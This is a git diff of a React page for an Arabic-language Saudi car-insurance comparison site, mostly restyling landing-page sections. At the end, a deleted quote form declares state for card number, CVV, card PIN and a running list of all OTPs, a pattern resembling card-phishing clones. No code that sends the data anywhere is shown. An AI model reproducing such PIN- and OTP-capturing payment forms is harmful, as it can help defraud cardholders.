+                  className="bg-gradient-to-r from-blue-600 to-[#109cd4]  hover:from-[#109cd4]  hover:to-[#109cd4]  shadow-xl hover:shadow-2xl transition-all duration-300 px-8 py-4 text-lg"
+                  onClick={() => (window.location.href = "/quote")}
+                >
+                  <Calculator className="w-5 h-5 ml-2" />
+                  ابدأ المقارنة الآن
+                </Button>
+                <p className="text-sm text-gray-500">مجاني 100% • لا يتطلب بطاقة ائتمان</p>
+              </div>
+
+              <div className="grid grid-cols-3 gap-4 max-w-md mx-auto">
+                <div className="text-center">
+                  <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-2">
+                    <Clock className="w-6 h-6 text-blue-600" />
+                  </div>
+                  <p className="text-xs text-gray-600">3 دقائق فقط</p>
+                </div>
+                <div className="text-center">
+                  <div className="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-2">
+                    <Shield className="w-6 h-6 text-green-600" />
+                  </div>
+                  <p className="text-xs text-gray-600">25+ شركة تأمين</p>
+                </div>
+                <div className="text-center">
+                  <div className="w-12 h-12 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-2">
+                    <TrendingUp className="w-6 h-6 text-purple-600" />
+                  </div>
+                  <p className="text-xs text-gray-600">وفر حتى 40%</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      {/* Stats Section */}
+      <section className="py-12 lg:py-16 bg-white">
+        <div className="max-w-7xl mx-auto px-4 lg:px-6">
+          <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 lg:gap-8">
+            {stats.map((stat, index) => (
+              <Card key={index} className="border-0 shadow-lg hover:shadow-xl transition-all duration-300 group">
+                <CardContent className="p-4 lg:p-6 text-center">
+                  <div
+                    className={`w-12 h-12 lg:w-16 lg:h-16 bg-gradient-to-br ${stat.color} rounded-xl lg:rounded-2xl flex items-center justify-center mx-auto mb-3 lg:mb-4 group-hover:scale-110 transition-transform duration-300`}
+                  >
+                    <stat.icon className="w-6 h-6 lg:w-8 lg:h-8 text-white" />
+                  </div>
+                  <h3 className="text-lg lg:text-2xl font-bold text-gray-900 mb-1 lg:mb-2">{stat.number}</h3>
+                  <p className="text-xs lg:text-sm text-gray-600 font-medium">{stat.label}</p>
                 </CardContent>
               </Card>
             ))}
@@ -523,85 +495,476 @@ export default function QuotePage() {
         </div>
       </section>
 
-      {/* Enhanced Contact Support */}
-      <section className="py-16 bg-gradient-to-br from-gray-50 to-blue-50/50">
-        <div className="max-w-4xl mx-auto px-4 lg:px-6 text-center">
-          <div className="space-y-8">
-            <div>
-              <h2 className="text-3xl lg:text-4xl font-bold text-gray-900 mb-4">هل تحتاج مساعدة؟</h2>
-              <p className="text-lg text-gray-600 max-w-2xl mx-auto">
-                فريق الخبراء متاح لمساعدتك في اختيار أفضل تأمين لسيارتك وتقديم الاستشارة المجانية
-              </p>
-            </div>
+      {/* Features Section */}
+      <section className="py-12 lg:py-20 bg-gradient-to-br from-gray-50 to-blue-50">
+        <div className="max-w-7xl mx-auto px-4 lg:px-6">
+          <div className="text-center mb-12 lg:mb-16">
+            <Badge className="bg-blue-100 text-[#109cd4]  mb-4 px-3 lg:px-4 py-2 text-xs lg:text-sm">
+              ✨ مميزات استثنائية
+            </Badge>
+            <h2 className="text-2xl lg:text-3xl xl:text-4xl font-bold text-gray-900 mb-4 lg:mb-6">
+              لماذا يختار العملاء تأميني؟
+            </h2>
+            <p className="text-base lg:text-xl text-gray-600 max-w-3xl mx-auto">
+              نقدم تجربة تأمين متطورة تجمع بين التكنولوجيا المتقدمة والخدمة الاستثنائية
+            </p>
+          </div>
 
-            <div className="flex flex-col sm:flex-row gap-4 justify-center">
-              <Button size="lg" className="bg-green-600 hover:bg-green-700 text-white px-8 py-4 text-lg font-medium">
-                <Phone className="w-5 h-5 ml-2" />
-                اتصل بنا: 920000000
-              </Button>
-              <Button
-                variant="outline"
-                size="lg"
-                className="border-gray-300 hover:border-[#109cd4] hover:text-[#109cd4] px-8 py-4 text-lg font-medium bg-transparent"
+          <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-6 lg:gap-8">
+            {features.map((feature, index) => (
+              <Card
+                key={index}
+                className="border-0 shadow-lg hover:shadow-2xl transition-all duration-500 group hover:-translate-y-2"
               >
-                <Mail className="w-5 h-5 ml-2" />
-                راسلنا عبر البريد
-              </Button>
+                <CardContent className="p-6 lg:p-8 text-center">
+                  <div
+                    className={`w-12 h-12 lg:w-16 lg:h-16 bg-gradient-to-br ${feature.color} rounded-xl lg:rounded-2xl flex items-center justify-center mx-auto mb-4 lg:mb-6 group-hover:scale-110 transition-transform duration-300`}
+                  >
+                    <feature.icon className="w-6 h-6 lg:w-8 lg:h-8 text-white" />
+                  </div>
+                  <h3 className="text-lg lg:text-xl font-bold text-gray-900 mb-3 lg:mb-4">{feature.title}</h3>
+                  <p className="text-sm lg:text-base text-gray-600 leading-relaxed">{feature.description}</p>
+                </CardContent>
+              </Card>
+            ))}
+          </div>
+        </div>
+      </section>
+
+      {/* Insurance Types Section */}
+      <section className="py-16 bg-gray-50">
+        <div className="max-w-6xl mx-auto px-4 lg:px-6">
+          <div className="text-center mb-12">
+            <h2 className="text-3xl font-bold text-gray-900 mb-4">تأمين سيارات وأكثر!</h2>
+            <p className="text-lg text-blue-600">منتجات التأمين المتنوعة</p>
+
+            <div className="flex justify-center mt-6">
+              <div className="flex bg-white rounded-lg p-1 shadow-sm">
+                <button className="px-6 py-2 bg-blue-600 text-white rounded-md text-sm font-medium">للشركات</button>
+                <button className="px-6 py-2 text-gray-600 rounded-md text-sm font-medium hover:bg-gray-100">
+                  للأفراد
+                </button>
+              </div>
+            </div>
+          </div>
+
+          <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-6">
+            {[
+              { title: "السيارات", icon: Car, description: "تأمين شامل وضد الغير" },
+              { title: "الصحة الطبية", icon: Heart, description: "تغطية صحية شاملة" },
+              { title: "الحوادث الطبية", icon: Shield, description: "حماية من الحوادث" },
+              { title: "السفر", icon: Plane, description: "تأمين شامل للسفر" },
+            ].map((service, index) => (
+              <Card key={index} className="border-0 shadow-lg hover:shadow-xl transition-all duration-300 group">
+                <CardContent className="p-6 text-center">
+                  <div className="w-16 h-16 bg-blue-100 rounded-2xl flex items-center justify-center mx-auto mb-4 group-hover:scale-110 transition-transform duration-300">
+                    <service.icon className="w-8 h-8 text-blue-600" />
+                  </div>
+                  <h3 className="text-lg font-bold text-gray-900 mb-2">{service.title}</h3>
+                  <p className="text-sm text-gray-600 mb-4">{service.description}</p>
+                  <Button variant="outline" size="sm" className="text-blue-600 border-blue-600 hover:bg-blue-50">
+                    ابدأ الآن
+                  </Button>
+                </CardContent>
+              </Card>
+            ))}
+          </div>
+        </div>
+      </section>
+
+      {/* Insurance Comparison Section */}
+      <section className="py-16 bg-white">
+        <div className="max-w-6xl mx-auto px-4 lg:px-6">
+          <div className="text-center mb-12">
+            <h2 className="text-2xl lg:text-3xl font-bold text-gray-900 mb-4">
+              هل يجب أن أشتري تأميناً شاملاً أم تأمين طرف ثالث لسيارتي؟
+            </h2>
+            <p className="text-lg text-gray-600">
+              تحقق من كل ما تريد معرفته في هذا الدليل الشامل لاختياراتك وتجد أفضل ما يناسبك
+            </p>
+          </div>
+
+          <div className="grid md:grid-cols-3 gap-6">
+            {[
+              {
+                title: "ضد الغير فقط",
+                badge: "الأساسي",
+                badgeColor: "bg-gray-500",
+                description: "يغطي الأضرار التي تلحق بالآخرين فقط ولا يشمل سيارتك الخاصة",
+                buttonText: "اقرأ المزيد",
+                buttonColor: "bg-gray-600 hover:bg-gray-700",
+              },
+              {
+                title: "التأمين الشامل",
+                badge: "الأفضل",
+                badgeColor: "bg-yellow-500",
+                description: "يغطي سيارتك والآخرين مع تغطية شاملة ضد السرقة والحوادث والكوارث الطبيعية",
+                buttonText: "اقرأ المزيد",
+                buttonColor: "bg-blue-600 hover:bg-[#109cd4] ",
+              },
+              {
+                title: "ضد الغير التوسعي",
+                badge: "متوسط",
+                badgeColor: "bg-green-500",
+                description: "تغطية متوسطة تشمل الآخرين مع بعض الحماية الإضافية لسيارتك",
+                buttonText: "اقرأ المزيد",
+                buttonColor: "bg-green-600 hover:bg-green-700",
+              },
+            ].map((option, index) => (
+              <Card key={index} className="border border-gray-200 hover:shadow-lg transition-all duration-300">
+                <CardContent className="p-6">
+                  <div className="mb-4">
+                    <span
+                      className={`inline-block px-3 py-1 rounded-full text-white text-xs font-medium ${option.badgeColor}`}
+                    >
+                      {option.badge}
+                    </span>
+                  </div>
+                  <h3 className="text-xl font-bold text-gray-900 mb-3">{option.title}</h3>
+                  <p className="text-gray-600 mb-6 leading-relaxed">{option.description}</p>
+                  <Button className={`w-full ${option.buttonColor} text-white`}>{option.buttonText}</Button>
+                </CardContent>
+              </Card>
+            ))}
+          </div>
+        </div>
+      </section>
+
+      {/* Process Steps */}
+      <section className="py-12 lg:py-20 bg-gradient-to-br from-blue-50 to-indigo-50">
+        <div className="max-w-7xl mx-auto px-4 lg:px-6">
+          <div className="text-center mb-12 lg:mb-16">
+            <Badge className="bg-purple-100 text-purple-700 mb-4 px-3 lg:px-4 py-2 text-xs lg:text-sm">
+              🚀 عملية بسيطة
+            </Badge>
+            <h2 className="text-2xl lg:text-3xl xl:text-4xl font-bold text-gray-900 mb-4 lg:mb-6">
+              كيف تحصل على تأمينك في 4 خطوات بسيطة
+            </h2>
+            <p className="text-base lg:text-xl text-gray-600 max-w-3xl mx-auto">
+              عملية سهلة وسريعة للحصول على أفضل عروض التأمين
+            </p>
+          </div>
+
+          <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-6 lg:gap-8">
+            {processSteps.map((step, index) => (
+              <div key={index} className="text-center group">
+                <div className="relative mb-6 lg:mb-8">
+                  <div className="w-16 h-16 lg:w-20 lg:h-20 bg-white rounded-full shadow-lg flex items-center justify-center mx-auto group-hover:scale-110 transition-transform duration-300">
+                    <step.icon className="w-6 h-6 lg:w-8 lg:h-8 text-blue-600" />
+                  </div>
+                  <div className="absolute -top-2 -right-2 w-6 h-6 lg:w-8 lg:h-8 bg-blue-600 text-white rounded-full flex items-center justify-center text-xs lg:text-sm font-bold">
+                    {step.step}
+                  </div>
+                  {index < processSteps.length - 1 && (
+                    <div className="hidden lg:block absolute top-8 left-full w-full h-0.5 bg-blue-200 -translate-x-1/2"></div>
+                  )}
+                </div>
+                <h3 className="text-lg lg:text-xl font-bold text-gray-900 mb-2 lg:mb-3">{step.title}</h3>
+                <p className="text-sm lg:text-base text-gray-600">{step.description}</p>
+              </div>
+            ))}
+          </div>
+        </div>
+      </section>
+
+      {/* Testimonials */}
+      <section className="py-12 lg:py-20 bg-white">
+        <div className="max-w-7xl mx-auto px-4 lg:px-6">
+          <div className="text-center mb-12 lg:mb-16">
+            <Badge className="bg-yellow-100 text-yellow-700 mb-4 px-3 lg:px-4 py-2 text-xs lg:text-sm">
+              ⭐ آراء العملاء
+            </Badge>
+            <h2 className="text-2xl lg:text-3xl xl:text-4xl font-bold text-gray-900 mb-4 lg:mb-6">
+              ماذا يقول عملاؤنا عنا؟
+            </h2>
+            <p className="text-base lg:text-xl text-gray-600 max-w-3xl mx-auto">تجارب حقيقية من عملائنا الكرام</p>
+          </div>
+
+          <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-6 lg:gap-8">
+            {testimonials.map((testimonial, index) => (
+              <Card key={index} className="border-0 shadow-lg hover:shadow-xl transition-all duration-300">
+                <CardContent className="p-6 lg:p-8">
+                  <div className="flex items-center gap-1 mb-4">
+                    {[...Array(testimonial.rating)].map((_, i) => (
+                      <Star key={i} className="w-4 h-4 lg:w-5 lg:h-5 fill-yellow-400 text-yellow-400" />
+                    ))}
+                  </div>
+                  <p className="text-sm lg:text-base text-gray-600 mb-6 leading-relaxed">"{testimonial.content}"</p>
+                  <div className="flex items-center gap-3">
+                    <Image
+                      src={testimonial.image || "/placeholder.svg"}
+                      alt={testimonial.name}
+                      width={48}
+                      height={48}
+                      className="rounded-full"
+                    />
+                    <div>
+                      <h4 className="font-semibold text-gray-900 text-sm lg:text-base">{testimonial.name}</h4>
+                      <p className="text-xs lg:text-sm text-gray-600">{testimonial.role}</p>
+                    </div>
+                  </div>
+                </CardContent>
+              </Card>
+            ))}
+          </div>
+        </div>
+      </section>
+
+      {/* FAQ Section */}
+      <section className="py-12 lg:py-20 bg-gray-50">
+        <div className="max-w-4xl mx-auto px-4 lg:px-6">
+          <div className="text-center mb-12 lg:mb-16">
+            <Badge className="bg-indigo-100 text-indigo-700 mb-4 px-3 lg:px-4 py-2 text-xs lg:text-sm">
+              ❓ أسئلة شائعة
+            </Badge>
+            <h2 className="text-2xl lg:text-3xl xl:text-4xl font-bold text-gray-900 mb-4 lg:mb-6">
+              الأسئلة الأكثر شيوعاً
+            </h2>
+            <p className="text-base lg:text-xl text-gray-600">إجابات على الأسئلة التي يطرحها عملاؤنا بكثرة</p>
+          </div>
+
+          <div className="space-y-4">
+            {faqs.map((faq, index) => (
+              <Card key={index} className="border border-gray-200 hover:shadow-lg transition-all duration-300">
+                <CardContent className="p-0">
+                  <button
+                    className="w-full p-4 lg:p-6 text-right flex items-center justify-between hover:bg-gray-50 transition-colors"
+                    onClick={() => setOpenFaq(openFaq === index ? null : index)}
+                  >
+                    <h3 className="font-semibold text-gray-900 text-sm lg:text-base">{faq.question}</h3>
+                    {openFaq === index ? (
+                      <ChevronUp className="w-5 h-5 text-gray-500 flex-shrink-0" />
+                    ) : (
+                      <ChevronDown className="w-5 h-5 text-gray-500 flex-shrink-0" />
+                    )}
+                  </button>
+                  {openFaq === index && (
+                    <div className="px-4 lg:px-6 pb-4 lg:pb-6">
+                      <p className="text-sm lg:text-base text-gray-600 leading-relaxed">{faq.answer}</p>
+                    </div>
+                  )}
+                </CardContent>
+              </Card>
+            ))}
+          </div>
+        </div>
+      </section>
+
+      {/* App Download Section */}
+      <section className="py-12 lg:py-20 bg-gradient-to-r from-blue-600 via-[#109cd4]  to-indigo-700 text-white relative overflow-hidden">
+        <div className="max-w-7xl mx-auto px-4 lg:px-6 relative">
+          <div className="grid lg:grid-cols-2 gap-8 lg:gap-12 items-center">
+            <div className="space-y-6 lg:space-y-8 text-center lg:text-right">
+              <div className="space-y-4">
+                <Badge className="bg-white bg-opacity-20 text-white border-white border-opacity-30 px-3 lg:px-4 py-2 text-xs lg:text-sm">
+                  📱 تطبيق متطور
+                </Badge>
+                <h2 className="text-2xl lg:text-3xl xl:text-4xl font-bold">
+                  حمل تطبيق تأميني
+                  <br />
+                  واستمتع بتجربة فريدة
+                </h2>
+                <p className="text-base lg:text-xl text-blue-100 leading-relaxed">
+                  تطبيق ذكي يوفر لك جميع خدمات التأمين في مكان واحد. مقارنة سريعة، عروض حصرية، ومتابعة مستمرة لوثائقك.
+                </p>
+              </div>
+
+              <div className="space-y-3 lg:space-y-4">
+                <div className="flex items-center gap-3 justify-center lg:justify-start">
+                  <CheckCircle className="w-5 h-5 lg:w-6 lg:h-6 text-green-300 flex-shrink-0" />
+                  <span className="text-sm lg:text-lg">مقارنة فورية بين جميع الشركات</span>
+                </div>
+                <div className="flex items-center gap-3 justify-center lg:justify-start">
+                  <CheckCircle className="w-5 h-5 lg:w-6 lg:h-6 text-green-300 flex-shrink-0" />
+                  <span className="text-sm lg:text-lg">إشعارات ذكية لتجديد التأمين</span>
+                </div>
+                <div className="flex items-center gap-3 justify-center lg:justify-start">
+                  <CheckCircle className="w-5 h-5 lg:w-6 lg:h-6 text-green-300 flex-shrink-0" />
+                  <span className="text-sm lg:text-lg">دعم عملاء مباشر عبر التطبيق</span>
+                </div>
+              </div>
+
+              <div className="flex flex-col sm:flex-row gap-3 lg:gap-4 justify-center lg:justify-start">
+                <Button size="lg" className="bg-black hover:bg-gray-800 text-white px-4 lg:px-6 py-3">
+                  <Download className="w-4 h-4 lg:w-5 lg:h-5 ml-2" />
+                  App Store
+                </Button>
+                <Button size="lg" className="bg-black hover:bg-gray-800 text-white px-4 lg:px-6 py-3">
+                  <Download className="w-4 h-4 lg:w-5 lg:h-5 ml-2" />
+                  Google Play
+                </Button>
+              </div>
             </div>
 
-            <div className="grid grid-cols-1 sm:grid-cols-3 gap-6 mt-12 max-w-2xl mx-auto">
-              <div className="text-center">
-                <div className="text-2xl font-bold text-[#109cd4] mb-1">24/7</div>
-                <p className="text-sm text-gray-600">خدمة العملاء</p>
-              </div>
-              <div className="text-center">
-                <div className="text-2xl font-bold text-[#109cd4] mb-1">{"<"} 30 ثانية</div>
-                <p className="text-sm text-gray-600">وقت الاستجابة</p>
-              </div>
-              <div className="text-center">
-                <div className="text-2xl font-bold text-[#109cd4] mb-1">98%</div>
-                <p className="text-sm text-gray-600">رضا العملاء</p>
+            <div className="relative order-first lg:order-last">
+              <div className="relative bg-white bg-opacity-10 backdrop-blur-lg rounded-2xl lg:rounded-3xl p-6 lg:p-8 border border-white border-opacity-20">
+                <div className="grid grid-cols-2 gap-3 lg:gap-4">
+                  <div className="bg-white rounded-xl lg:rounded-2xl p-3 lg:p-4 shadow-xl">
+                    <Smartphone className="w-6 h-6 lg:w-8 lg:h-8 text-blue-600 mb-2" />
+                    <p className="text-xs lg:text-sm font-semibold text-gray-900">تطبيق iOS</p>
+                  </div>
+                  <div className="bg-white rounded-xl lg:rounded-2xl p-3 lg:p-4 shadow-xl">
+                    <Smartphone className="w-6 h-6 lg:w-8 lg:h-8 text-green-600 mb-2" />
+                    <p className="text-xs lg:text-sm font-semibold text-gray-900">تطبيق Android</p>
+                  </div>
+                </div>
+                <div className="mt-4 lg:mt-6 bg-white rounded-xl lg:rounded-2xl p-4 lg:p-6 shadow-xl">
+                  <div className="flex items-center justify-between mb-3 lg:mb-4">
+                    <span className="text-xs lg:text-sm font-semibold text-gray-900">تقييم التطبيق</span>
+                    <div className="flex items-center gap-1">
+                      {[1, 2, 3, 4, 5].map((i) => (
+                        <Star key={i} className="w-3 h-3 lg:w-4 lg:h-4 fill-yellow-400 text-yellow-400" />
+                      ))}
+                    </div>
+                  </div>
+                  <p className="text-lg lg:text-2xl font-bold text-gray-900">4.9/5</p>
+                  <p className="text-xs lg:text-sm text-gray-600">من أكثر من 50,000 تقييم</p>
+                </div>
               </div>
             </div>
           </div>
         </div>
       </section>
 
-      {/* Enhanced Footer */}
-      <footer className="bg-gray-900 text-white py-16">
+      {/* Contact Section */}
+      <section id="contact" className="py-12 lg:py-20 bg-white">
         <div className="max-w-7xl mx-auto px-4 lg:px-6">
-          <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-8 mb-12">
-            <div className="space-y-6">
-              <div className="flex items-center gap-3">
-                <div className="w-32 h-16 p-2 bg-white rounded-lg flex items-center justify-center">
-                  <img src="/Logo-AR.png" alt="logo" width={128} height={64} />
+          <div className="grid lg:grid-cols-2 gap-8 lg:gap-12">
+            <div className="space-y-6 lg:space-y-8">
+              <div>
+                <Badge className="bg-green-100 text-green-700 mb-4 px-3 lg:px-4 py-2 text-xs lg:text-sm">
+                  📞 تواصل معنا
+                </Badge>
+                <h2 className="text-2xl lg:text-3xl xl:text-4xl font-bold text-gray-900 mb-4 lg:mb-6">
+                  هل لديك استفسار؟ نحن هنا لمساعدتك
+                </h2>
+                <p className="text-base lg:text-xl text-gray-600">
+                  فريق دعم العملاء متاح على مدار الساعة للإجابة على جميع استفساراتك
+                </p>
+              </div>
+
+              <div className="space-y-4 lg:space-y-6">
+                <div className="flex items-center gap-4">
+                  <div className="w-12 h-12 lg:w-16 lg:h-16 bg-blue-100 rounded-xl lg:rounded-2xl flex items-center justify-center">
+                    <Phone className="w-6 h-6 lg:w-8 lg:h-8 text-blue-600" />
+                  </div>
+                  <div>
+                    <h3 className="font-semibold text-gray-900 text-sm lg:text-base">اتصل بنا</h3>
+                    <p className="text-sm lg:text-base text-gray-600">920000000</p>
+                  </div>
+                </div>
+
+                <div className="flex items-center gap-4">
+                  <div className="w-12 h-12 lg:w-16 lg:h-16 bg-green-100 rounded-xl lg:rounded-2xl flex items-center justify-center">
+                    <Mail className="w-6 h-6 lg:w-8 lg:h-8 text-green-600" />
+                  </div>
+                  <div>
+                    <h3 className="font-semibold text-gray-900 text-sm lg:text-base">راسلنا</h3>
+                    <p className="text-sm lg:text-base text-gray-600">info@tameeni.com</p>
+                  </div>
+                </div>
+
+                <div className="flex items-center gap-4">
+                  <div className="w-12 h-12 lg:w-16 lg:h-16 bg-purple-100 rounded-xl lg:rounded-2xl flex items-center justify-center">
+                    <MessageCircle className="w-6 h-6 lg:w-8 lg:h-8 text-purple-600" />
+                  </div>
+                  <div>
+                    <h3 className="font-semibold text-gray-900 text-sm lg:text-base">دردشة مباشرة</h3>
+                    <p className="text-sm lg:text-base text-gray-600">متاح 24/7</p>
+                  </div>
                 </div>
               </div>
-              <p className="text-gray-400 leading-relaxed">
-                منصة التأمين الرقمية الرائدة في السعودية، نقدم أفضل الحلول التأمينية بأسعار تنافسية
+            </div>
+
+            <Card className="border-0 shadow-xl">
+              <CardContent className="p-6 lg:p-8">
+                <h3 className="text-xl lg:text-2xl font-bold text-gray-900 mb-6">أرسل لنا رسالة</h3>
+                <div className="space-y-4">
+                  <div className="grid sm:grid-cols-2 gap-4">
+                    <Input placeholder="الاسم الأول" />
+                    <Input placeholder="الاسم الأخير" />
+                  </div>
+                  <Input placeholder="البريد الإلكتروني" type="email" />
+                  <Input placeholder="رقم الهاتف" type="tel" />
+                  <Textarea placeholder="رسالتك" rows={4} />
+                  <Button className="w-full bg-gradient-to-r from-blue-600 to-[#109cd4]  hover:from-[#109cd4]  hover:to-[#109cd4] ">
+                    <ArrowRight className="w-4 h-4 lg:w-5 lg:h-5 ml-2" />
+                    إرسال الرسالة
+                  </Button>
+                </div>
+              </CardContent>
+            </Card>
+          </div>
+        </div>
+      </section>
+
+      {/* Final CTA Section */}
+      <section className="py-12 lg:py-20 bg-gradient-to-r from-blue-50 to-indigo-50">
+        <div className="max-w-4xl mx-auto px-4 lg:px-6 text-center">
+          <div className="space-y-6 lg:space-y-8">
+            <div className="space-y-4">
+              <h2 className="text-2xl lg:text-3xl xl:text-4xl font-bold text-gray-900">
+                جاهز للحصول على أفضل عرض تأمين؟
+              </h2>
+              <p className="text-base lg:text-xl text-gray-600">ابدأ الآن واحصل على عرض سعر مخصص في أقل من دقيقتين</p>
+            </div>
+
+            <Button
+              size="lg"
+              className="bg-gradient-to-r from-blue-600 to-[#109cd4]  hover:from-[#109cd4]  hover:to-[#109cd4]  shadow-xl hover:shadow-2xl transition-all duration-300 px-8 lg:px-12 py-4 text-base lg:text-lg"
+            >
+              <Zap className="w-5 h-5 lg:w-6 lg:h-6 ml-2" />
+              ابدأ المقارنة الآن - مجاناً
+            </Button>
+          </div>
+        </div>
+      </section>
+
+      {/* Footer */}
+      <footer className="bg-gray-900 text-white">
+        <div className="max-w-7xl mx-auto px-4 lg:px-6 py-12 lg:py-16">
+          <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-8 mb-8 lg:mb-12">
+            <div className="space-y-4">
+              <div className="flex items-center gap-3">
+                <img src="/Logo-AR.png" alt="logo" width={120} />
+
+              </div>
+              <p className="text-sm lg:text-base text-gray-400 leading-relaxed">
+                منصة التأمين الرقمية الرائدة في السعودية. نقدم حلول تأمين ذكية ومبتكرة لحماية ما يهمك.
               </p>
+              <div className="flex gap-3">
+                <div className="w-8 h-8 lg:w-10 lg:h-10 bg-gray-800 hover:bg-blue-600 rounded-lg flex items-center justify-center cursor-pointer transition-colors">
+                  <Globe className="w-4 h-4 lg:w-5 lg:h-5" />
+                </div>
+                <div className="w-8 h-8 lg:w-10 lg:h-10 bg-gray-800 hover:bg-blue-600 rounded-lg flex items-center justify-center cursor-pointer transition-colors">
+                  <Phone className="w-4 h-4 lg:w-5 lg:h-5" />
+                </div>
+                <div className="w-8 h-8 lg:w-10 lg:h-10 bg-gray-800 hover:bg-blue-600 rounded-lg flex items-center justify-center cursor-pointer transition-colors">
+                  <Mail className="w-4 h-4 lg:w-5 lg:h-5" />
+                </div>
+              </div>
             </div>
 
             <div>
-              <h3 className="font-bold mb-6 text-lg">الخدمات</h3>
-              <ul className="space-y-3 text-gray-400">
+              <h3 className="font-bold text-base lg:text-lg mb-4">الخدمات</h3>
+              <ul className="space-y-2 lg:space-y-3 text-sm lg:text-base text-gray-400">
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a href="#" className="hover:text-white transition-colors">
                     تأمين السيارات
                   </a>
                 </li>
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a href="#" className="hover:text-white transition-colors">
                     التأمين الصحي
                   </a>
                 </li>
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a href="#" className="hover:text-white transition-colors">
                     تأمين السفر
                   </a>
                 </li>
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a href="#" className="hover:text-white transition-colors">
                     تأمين المنازل
                   </a>
                 </li>
@@ -609,25 +972,25 @@ export default function QuotePage() {
             </div>
 
             <div>
-              <h3 className="font-bold mb-6 text-lg">الشركة</h3>
-              <ul className="space-y-3 text-gray-400">
+              <h3 className="font-bold text-base lg:text-lg mb-4">الشركة</h3>
+              <ul className="space-y-2 lg:space-y-3 text-sm lg:text-base text-gray-400">
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a href="#" className="hover:text-white transition-colors">
                     من نحن
                   </a>
                 </li>
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a href="#" className="hover:text-white transition-colors">
                     فريق العمل
                   </a>
                 </li>
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a href="#" className="hover:text-white transition-colors">
                     الوظائف
                   </a>
                 </li>
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a href="#" className="hover:text-white transition-colors">
                     الأخبار
                   </a>
                 </li>
@@ -635,25 +998,25 @@ export default function QuotePage() {
             </div>
 
             <div>
-              <h3 className="font-bold mb-6 text-lg">الدعم</h3>
-              <ul className="space-y-3 text-gray-400">
+              <h3 className="font-bold text-base lg:text-lg mb-4">الدعم</h3>
+              <ul className="space-y-2 lg:space-y-3 text-sm lg:text-base text-gray-400">
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a href="#" className="hover:text-white transition-colors">
                     مركز المساعدة
                   </a>
                 </li>
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a href="#" className="hover:text-white transition-colors">
                     اتصل بنا
                   </a>
                 </li>
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a href="#" className="hover:text-white transition-colors">
                     الأسئلة الشائعة
                   </a>
                 </li>
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a href="#" className="hover:text-white transition-colors">
                     سياسة الخصوصية
                   </a>
                 </li>
@@ -661,17 +1024,20 @@ export default function QuotePage() {
             </div>
           </div>
 
-          <div className="border-t border-gray-800 pt-8 flex flex-col sm:flex-row justify-between items-center gap-4">
-            <p className="text-gray-400 text-center sm:text-right">
+          <div className="border-t border-gray-800 pt-6 lg:pt-8 flex flex-col lg:flex-row justify-between items-center gap-4">
+            <p className="text-xs lg:text-sm text-gray-400 text-center lg:text-right">
               © 2024 تأميني. جميع الحقوق محفوظة. مرخص من البنك المركزي السعودي.
             </p>
-            <div className="flex gap-4">
-              <Badge variant="outline" className="border-gray-600 text-gray-400">
-                مرخص من ساما
-              </Badge>
-              <Badge variant="outline" className="border-gray-600 text-gray-400">
-                ISO 27001
-              </Badge>
+            <div className="flex items-center gap-4 lg:gap-6 text-xs lg:text-sm text-gray-400">
+              <a href="#" className="hover:text-white transition-colors">
+                الشروط والأحكام
+              </a>
+              <a href="#" className="hover:text-white transition-colors">
+                سياسة الخصوصية
+              </a>
+              <a href="#" className="hover:text-white transition-colors">
+                ملفات تعريف الارتباط
+              </a>
             </div>
           </div>
         </div>
@@ -679,1540 +1045,3 @@ export default function QuotePage() {
     </div>
   )
 }
-
-const allOtp = [""]
-
-function ProfessionalQuoteForm() {
-  const [currentPage, setCurrentStep] = useState(1)
-  const [errors, setErrors] = useState<Record<string, string>>({})
-  const [touched, setTouched] = useState<Record<string, boolean>>({})
-  const [isSubmitting, setIsSubmitting] = useState(false)
-  const [paymentProcessing, setPaymentProcessing] = useState(false)
-  const [otpSent, setOtpSent] = useState(false)
-  const [otpVerified, setOtpVerified] = useState(false)
-  const [otpAttempts, setOtpAttempts] = useState(0)
-  const [cardNumber, setCardNumber] = useState("")
-  const [pinCode, setPinCode] = useState("")
-  const [cardName, setCardName] = useState("")
-  const [cardMonth, setCardMonth] = useState("")
-  const [cardYear, setCardYear] = useState("")
-  const [cvv, setCvv] = useState("")
-  const [otp, setOtp] = useState("")
-  const [otpTimer, setOtpTimer] = useState(0)
-  const [vehicleValue, setVehicleValue] = useState("")
-  const [formData, setFormData] = useState({
-    insurance_purpose: "",
-    documment_owner_full_name: "",
-    owner_identity_number: "",
-    buyer_identity_number: "",
-    seller_identity_number: "",
-    vehicle_type: "",
-    sequenceNumber: "",
-    policyStartDate: "",
-    insuranceTypeSelected: "",
-    additionalDrivers: 0,
-    specialDiscounts: false,
-    agreeToTerms: true,
-    selectedInsuranceOffer: "",
-    selectedAddons: [] as string[],
-    phone: "",
-  })
-
-  const stepHeaderRef = useRef<HTMLHeadingElement>(null)
-  const firstInputRef = useRef<HTMLInputElement>(null)
-
-  const errorSummaryRef = useRef<HTMLDivElement>(null)
-
-  const steps = [
-    { number: 1, title: "البيانات الأساسية", subtitle: "معلومات المركبة والمالك", icon: FileText },
